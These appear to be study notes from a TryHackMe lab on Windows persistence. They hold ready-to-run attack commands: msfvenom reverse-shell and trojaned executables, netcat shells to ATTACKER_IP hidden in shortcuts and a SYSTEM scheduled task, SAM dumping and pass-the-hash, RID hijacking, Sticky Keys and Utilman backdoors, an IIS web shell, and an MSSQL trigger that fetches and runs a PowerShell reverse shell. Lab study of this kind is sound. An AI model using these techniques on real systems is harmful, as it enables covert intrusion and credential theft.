# Windows Privilege Escalation
> [TryHackMe Link](https://tryhackme.com/room/windowslocalpersistence)

Persistence refers to creating alternate ways to regain access to a host without going through the exploitation phase all over again. You may want to establish persistence if: 
- Re-exploitation isn't possible
- Gaining a foothold is hard to reproduce (phishing campaign)
- Patches to vulnerability have been deployed 

## Assign Group Memberships
Direct way to make an unprivileged user gain administrative privileges is to make it part of the **Administrators** group. We can achieve this with:
- `net localgroup administrators <USER> /add`

The **Backup Operators** group means that Users in this group won't have administrative privileges but will be allowed to read/write any file or registry key on the system, ignoring any configured DACL
- `net localgroup "Backup Operators" <USER> /add`
-  Note: Since this is an unprivileged account, it cannot RDP or WinRM back to the machine unless we add it to the **Remote Desktop Users** (RDP) or **Remote Management Users** (WinRM) groups. 
-  `net localgroup "Remote Management Users" <USER> /add`

You can now WinRM into the machine using `evil-winrm -i <TARGET_IP> -u <USER> -p <PASSWORD>` and perform a pass the hash attack:
1. `reg save hklm\system system.bak` and `reg save hklm\sam sam.bak`
2. `download system.bak` and `download sam.bak`
3. `impacket-secretsdump -sam sam.bak -system system.bak LOCAL`
4. `evil-winrm -i 10.129.162.238 -u Administrator -H <HASH>`


- **LocalAccountTokenFilterPolicy** is implemented by UAC strips any local account of its administrative privileges when logging in remotely. Means in WinRM you are confined to a limited access token with no administrative privileges.
- `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1` Disables this token

## Special Privileges and Security Descriptors
Special groups are where the operating system assigns them specific privileges by default. [Privileges](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants) being the capacity to do a task on the system itself. 

``` 
Example:
Backup Operators group, it has the following two privileges assigned by default:
- SeBackupPrivilege: The user can read any file in the system, ignoring any DACL in place.
- SeRestorePrivilege: The user can write any file in the system, ignoring any DACL in place.
```

We can assign such privileges to any user, independent of their group memberships following the process in Powershell:
1. Export the current configuration to a temporary file:
   -  `secedit /export /cfg config.inf`
2. Open the file and add our user to the lines in the configuration to add our user to priveliges we want
3. Convert the .inf file into a .sdb file which is then used to load the configuration back into the system
   - `secedit /import /cfg config.inf /db config.sdb`
   - `secedit /configure /db config.sdb /cfg config.inf`


Security descriptor as an ACL but applied to other system facilities. We can change the security descriptor associated with the WinRM service to allow our USER to connect. 
- `Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI`
- Add the user and provide them Full Control

> **Note**: These steps mean that when running `net user <USER>` nothing suspicious appears.

## RID Hijacking
When a user is created, an identifier called Relative ID (RID) is assigned to them which is a numeric identifier representing the user across the system. When a user logs on, the LSASS process gets its RID from the SAM registry hive and creates an access token associated with that RID. If you tamper with the registry value and make windows assign an Administrator access token to an unprivileged user by associating the same RID to both accounts.

The default Administrator account is assigned the RID = 500, and regular users usually have RID >= 1000.
- `wmic useraccount get name,sid`
- The SID is an identifier that allows the operating system to identify a user across a domain

We need to access the SAM using Regedit, but that is restricted to a SYSTEM account only, so even the Administrator won't be able to edit it. To run Regedit as SYSTEM, we will use psexec: 
1. `PsExec64.exe -i -s regedit`
2. Opens regedit and go to `HKLM\SAM\SAM\Domains\Account\Users\`
3. Each key represents a user and we need to search for a key with its RID in hex being the last value (1010 = 0x3F2)
4. There will be a value called F, which holds the user's effective RID at position 0x30 (the RID is stored using little-endian notation, so its bytes appear reversed
5. Replace those two bytes with the RID of Administrator in hex (500 = 0x01F4), switching around the bytes (F401)
6. Can now RDP in as USER and will be Admin

## Executable Files

Plant a payload of your preference in any .exe file with msfvenom, leaving the binary to execute additional payloads silently by adding an extra thread in the binary.
- `msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe`
- Resulting puttyX.exe will execute a reverse_tcp meterpreter payload without the user noticing it

### Shortcut Files

Instead of altering the exe directly we modify a associated shortcut. Instead of pointing directly to the expected executable, we can change it to point to a script that will run a backdoor and then execute the usual program normally.

1. Writing a Powershell script which executes code before running the original target: 
```
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"

C:\Windows\System32\calc.exe
```
2. Change the shortcut to point to our script (update the icon to reflect the original program)
3. `powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1` can now become the target in the shortcut settings
   1. Running our script on a hidden window using the `-windowstyle` hidden (Powershell might flash on launch)

### Hijacking File Associations

Hijack any file association to force the operating system to run a shell whenever the user opens a specific file type. The default operating system file associations are kept inside the registry, where a key is stored for every single file type under `HKLM\Software\Classes\`.
**Example:**
- Check for the `.txt` subkey and find which **Programmatic ID (ProgID)** is associated with opening .txt files
  - A ProgID is simply an identifier to a program installed on the system
- Search for a subkey for the corresponding ProgID (under `HKLM\Software\Classes\`), where we will find a reference to the program in charge of handling .txt files
  - Most ProgID entries will have a subkey under `shell\open\command` where the default command to be run for files with that extension is specified
- In this case, when you try to open a .txt file, the system will execute %SystemRoot%\system32\NOTEPAD.EXE %1, where %1 represents the name of the opened file

## Abusing Services
Windows services offer a great way to establish persistence since they can be configured to run in the background whenever the victim machine is started. A service is an executable that runs in the background. When configuring a service, you define which executable will be used and select if the service will automatically run when the machine starts or should be manually started.

### Creating Background Services
We can create and start a service using the following commands:
```
sc.exe create <SERVICE_NAME> binPath= "net user Administrator Passwd123" start= auto
sc.exe start <SERVICE_NAME>
```
- There must be a space after each equal sign for the command to work.
- The "net user" command will be executed when the service is started, resetting the Administrator's password to Passwd123
- The service has been set to start automatically (start= auto), so that it runs without requiring user interaction

Creating a reverse shell with `msfvenom` and associate it with the created service. 
- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe`
  - Copy this executable to the target
- Run:
```
sc.exe create <SERVICE_NAME> binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start <SERVICE_NAME>
```

> **Note:** service executables are unique since they need to implement a particular protocol to be handled by the system

### Modifying existing services

Creating new services could be a monitored event, therefore re-using existing services (disabled services) could be a better candidate. 
- `sc.exe query state=all` - Return all current services 
- `sc.exe qc <SERVICE_NAME>` - Query a service's configuration

The three things we care about for persistence are: 
- The executable (**BINARY_PATH_NAME**) should point to our payload.
- The service **START_TYPE** should be automatic so that the payload runs without user interaction.
- The **SERVICE_START_NAME**, which is the account under which the service will run, should preferably be set to LocalSystem to gain SYSTEM privileges.

Steps: 
1. Create a revershell
   1. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe`
2. Reconfigure a service's parameters
   1. `sc.exe config <SERVICE_NAME> binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"`

## Scheduled Tasks

### Task Schedular
The task scheduler allows for granular control of when your task will start, allowing you to configure tasks that will activate at specific hours, repeat periodically or even trigger when specific system events occur. You can use [schtasks](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks) to interact with the task scheduler. 
- `schtasks /create /sc minute /mo 1 /tn <TASK_NAME> /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM SUCCESS: The scheduled task "<TASK_NAME>" has successfully been created.`
  - Runs a nc64 reverse shell every single minute
  - `/sc` and `/mo` indicate that the task should run every minute
  - `/ru` indicates privilige of task
- `schtasks /query /tn <TASK_NAME>`
  - Check if the task has been created 

### Hiding Tasks
Hide our scheduled task, we can make it invisible to any user in the system by deleting its Security Descriptor (SD). The SD is an ACL that states which users have access to the scheduled task. If your user isn't allowed to query a scheduled task, you won't be able to see it anymore, as Windows only shows you the tasks that you have permission to use. You can only erase the value if you hold SYSTEM privileges
- Deleting the SD is equivalent to disallowing all users' access to the scheduled task, including administrators.
- Security descriptors of all scheduled tasks are stored in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`

## Logon Triggered Persistence 
Some actions performed by a user might also be bound to executing specific payloads for persistence. Windows operating systems present several ways to link payloads with particular interactions. 

### StartUp folder
Each user has a folder under `C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` where you can put executables to be run whenever the user logs in. An attacker can achieve persistence just by dropping a payload in there.
- If we want to force all users to run a payload while logging in, we can use the folder under `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` in the same way.

#### Example
1. Generate reverse shell
   1. `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe`
2. Setup local http.server and use wget on victim to download it
   1. `python3 -m http.server` <- Adversary System
   2. `wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe` <- Victim System
3. Store the payload in the folder
   1. `copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"`

### Run / RunOnce
You can also force a user to execute a program on logon via the registry entries to specify applications to run at logon
- HKCU\Software\Microsoft\Windows\CurrentVersion\Run
- HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
- HKLM\Software\Microsoft\Windows\CurrentVersion\Run
- HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

Create a `REG_EXPAND_SZ` registry entry under a registry entry. The entry's name can be anything and the value will be the command we want to execute.

> **Note:** The registry entries under HKCU will only apply to the current user, and those under HKLM will apply to everyone.

### Winlogon
Winlogon is the Windows component that loads your user profile right after authentication. Winlogon uses some registry keys under `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\`
- `Userinit` points to `userinit.exe`, which is in charge of restoring your user profile preferences
- `shell` points to the system's shell, which is usually `explorer.exe`

We cannot replace these executables as this would break the login process, however we can append commands separated by a comma such as executing our revershell payload. 

### Logon scripts
`userinit.exe` checks for an environment variable called `UserInitMprLogonScript`. This environment variable can be used to assign a logon script to a user that will get run when logging into the machine. The variable isn't set by default, so we can just create it and assign any script we like.
- To create an environment variable for a user we can edit `HKCU\Environment` in the registry. Set the `UserInitMprLogonScript` entry to point to the revshell payload so it gets loaded when the users logs in (the backdoor only applies to the current user only)

## BackDoor Login Screen / RDP
Access to the physical machine means we can backdoor the login screen to access a terminal without having valid credentials for a machine.

### Sticky Keys
Establish persistence using Sticky Keys, we will abuse a shortcut enabled by default in any Windows installation that allows us to activate Sticky Keys by pressing SHIFT 5 times
- Windows will execute the binary in C:\Windows\System32\sethc.exe. If we are able to replace such binary for a payload of our preference such as a copy of cmd.exe
- To overwrite sethc.exe, we first need to take ownership of the file and grant our current user permission to modify it
  - `takeown /f c:\Windows\System32\sethc.exe`
  - `icacls C:\Windows\System32\sethc.exe /grant Administrator:F`
  - `copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe`
- press SHIFT five times to access a terminal with SYSTEM privileges directly from the login screen

### Utilman
Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen. When we click the ease of access button on the login screen, it executes `C:\Windows\System32\Utilman.exe` with SYSTEM privileges. If we replace it with a copy of cmd.exe, we can bypass the login screen
- This process is identical to sticky keys

## Existing Services

### WebShells
The usual way of achieving in a web server is by uploading a web shell to the web directory which will grant us access with the privileges of the configured user in Internet Information Services (IIS), which by default is `iis apppool\defaultapppool`.
1. Download a ASP.NET web shell from [here](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx)
2. Transfer it to the victim machine and move it into the webroot, which by default is located in the `C:\inetpub\wwwroot directory`
   1. `move shell.aspx C:\inetpub\wwwroot\`
   2. Depending on the way you create/transfer shell.aspx, the permissions in the file may not allow the web server to access it (`icacls shell.aspx /grant Everyone:F`)
3. Can then run commands from the webserver at `http://MACHINE_IP/shell.aspx`

### MSSQL Backdoor
There are many ways to plant a backdoor in MSSQL

One of them is through abusing **triggers** in MSSQL, these allow you to bind actions to be performed when specific events occur in the database (logging in - data being inserted). 

## Create a Trigger for Any `INSERT` into the `HRDB` Database

### 1. Enable the `xp_cmdshell` Stored Procedure

> This is a stored procedure that is provided by default in any MSSQL installation and allows you to run commands directly in the system's console but comes disabled by default.

1. Open **Microsoft SQL Server Management Studio 18**
2. Use **Windows Authentication** (the default value), and you will be logged on with the credentials of your current Windows User
3. Click on the **New Query** button to open the query editor and run:

```sql
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
```

> By default, only database users with the `sysadmin` role will be able to run `xp_cmdshell`.

---

### 2. Grant Impersonation Privileges

We can grant privileges to all users to impersonate the `sa` user, which is the default database administrator.

```sql
USE master

GRANT IMPERSONATE ON LOGIN::sa to [Public];
```

---

### 3. Configure the Trigger

Start by changing to the `HRDB` database:

```sql
USE HRDB
```

Our trigger will leverage `xp_cmdshell` to execute Powershell to download and run a `.ps1` file from a web server.

The trigger will be configured to execute whenever an `INSERT` is made into the `Employees` table of the `HRDB` database.

```sql
CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
```

---

## `evilscript.ps1`

```powershell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);

$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);

    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};

$client.Close()
```

---

## Handling the Connections

We will need to open **two terminals** to handle the connections involved in this exploit:

* The trigger will perform the first connection to download and execute `evilscript.ps1`

  * Our trigger is using port `8000` for that

* The second connection will be a reverse shell on port `4454` back to our attacker machine

---

## Trigger Execution

Insert an employee into the web application.

Since the web application will send an `INSERT` statement to the database, our `TRIGGER` will provide us access to the system's console.
